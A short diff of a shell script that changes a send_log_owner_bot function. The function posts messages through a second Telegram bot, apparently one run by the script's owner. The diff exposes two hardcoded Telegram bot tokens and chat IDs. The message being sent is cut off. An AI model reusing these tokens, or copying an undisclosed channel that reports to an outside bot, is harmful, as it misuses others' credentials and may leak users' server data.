@@ -18,8 +18,8 @@ function send_log() {
     curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 function send_log_owner_bot() {
-    CHATIDX="6006599143:AAEgstCAioq35JgX97HaW_G3TAkLKzLZS_w"
-    KEYX="1210833546"
+    CHATIDX="7215751605:AAGME1lIttpGifldUQD_QReHgJ9M4CajmPc"
+    KEYX="6015970325"
     TIME="10"
     URLX="https://api.telegram.org/bot$KEYX/sendMessage"
     TEXT="
